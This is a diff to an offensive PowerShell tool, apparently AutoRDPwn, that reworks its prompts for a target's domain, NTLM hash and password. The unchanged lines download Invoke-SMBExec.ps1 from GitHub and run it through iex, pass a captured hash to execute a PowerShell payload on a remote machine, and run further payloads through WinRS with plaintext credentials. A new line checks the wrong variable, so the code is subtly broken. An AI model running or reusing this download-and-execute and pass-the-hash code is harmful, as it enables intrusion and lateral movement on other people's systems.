@@ -255,10 +255,11 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
 	$user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
 	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
-        Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
-        $domain = $Host.UI.ReadLine() ; if(!$domain) { $domain = 'localhost' ; Write-Host "localhost" }
-        do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
-        $hash = $Host.UI.ReadLine() ; if(!$hash) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $hash )
+        Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $domain = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
+	$domain = 'localhost' ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
+        if(!$hash) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $hash )
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1" ; Write-Host
@@ -322,10 +323,9 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
 	$user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
 	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
-        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
-	$Host.UI.RawUI.ForegroundColor = 'Blue'
+        do { Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $password = $Host.UI.ReadLineAsSecureString()
+	$PlainTextPassword = ConvertFrom-SecureToPlain $password ; if(!$PlainTextPassword) { Write-Host ; Write-Host $txt6 -ForegroundColor Red
+	sleep -milliseconds 2500 }} until ( $PlainTextPassword ) ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
